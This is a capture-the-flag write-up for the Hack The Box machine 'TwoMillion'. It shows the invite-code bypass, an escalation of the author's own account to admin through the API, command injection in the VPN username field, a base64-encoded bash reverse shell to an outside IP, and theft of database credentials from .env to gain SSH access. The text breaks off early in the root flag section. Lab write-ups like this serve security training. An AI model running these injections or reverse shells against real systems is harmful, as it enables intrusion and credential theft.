# TwoMillion

## User flag

Found in the api **http://2million.htb//js/inviteapi.min.js**

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

De-obfuscates to:

```
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
 
url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
} })
}
```
```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

```

Decrypting with rot13 gives ```


Doing a post request to the API gives us: **In order to generate the invite code, make a POST request to /api/v1/invite/generate**

```
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "WUVNVEItQ0IxWE4tUTZHUFUtQUY2Q0U=",
    "format": "encoded"
  }
}

Base64 decoding:
```
```
echo WUVNVEItQ0IxWE4tUTZHUFUtQUY2Q0U= | base64 -d
YEMTB-CB1XN-Q6GPU-AF6CE
```

Now we can use this towards the 2million.htb/invite page:

<img width="396" height="289" alt="Screenshot 2025-09-07 at 17 47 06" src="https://github.com/user-attachments/assets/a7ef18a1-5770-4ed0-aa80-18b9f05e72f6" />

There is an access page where we can download a connection pack:

<img width="478" height="542" alt="Screenshot 2025-09-07 at 17 48 58" src="https://github.com/user-attachments/assets/17a22c18-067e-4e2b-906c-3151b659d946" />


Inspecting with burp we get the same api path as before: **/api/v1...**

Using curl along with our cookie to get some info on the api endpoints:

```
curl 2million.htb/api/v1 --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" | jq

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Here we can check if our own account is set as admin with curl, generate VPN, and update user settings. We are not admin as expected, but that can change with a call to **/api/v1/admin/settings/update**.

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53    0    53    0     0    425      0 --:--:-- --:--:-- --:--:--   427
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Missing content type we add it:

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56    0    56    0     0    436      0 --:--:-- --:--:-- --:--:--   437
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Another clue, lets add email: 

```
(base) simonstrombackolofsson@Simons-Air HTB % curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test"}' | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    85    0    59  100    26    488    215 --:--:-- --:--:-- --:--:--   708
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Again...

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test","is_admin":true}' | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   118    0    76  100    42    628    347 --:--:-- --:--:-- --:--:--   975
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```
Such a very generous api! Thank you for this very fine information!

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data  '{"email":"test@test.test","is_admin":1}' | jq   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    83    0    44  100    39    339    301 --:--:-- --:--:-- --:--:--   643
{
  "id": 18,
  "username": "testtest",
  "is_admin": 1
}
```
Finally!



This was done to be able to run the **generate** api, after some of the same progress as above we figure out the correct --data format and so on:

```
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test"}'

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBO
...
...
```

Here we can inject terminal commands by adding e.g **;whoami;** to the data field``` curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test;whoami;"}'``` which returns as: ```www-data``` very good.


We want to inject a reverse shell the same way now: ```bash -i >& /dev/tcp/10.10.16.49/1234 0>&1```. Injecting it in plaintext like this did not work, so we'll encode it as base64 to avoid sanitization:

```
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test;echo CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDkvMTIzNCAwPiYxCg== | base64 -d | bash;"}'
```

And we are in:

```
nc -l 1233 
bash: cannot set terminal process group (1193): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ ls
ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
www-data@2million:~/html$ whoami
whoami
www-data
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2million:~/html$ ls -a
ls -a
.
..
.env
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

We find some interesting credentials within the php .env file, we can use this to ssh into the admin account:

```
admin@2million:~$ ls
user.txt
```

## Root flag

Navigating to website /var/www folder, not finding anything. But I do locate a folder /var/mail/
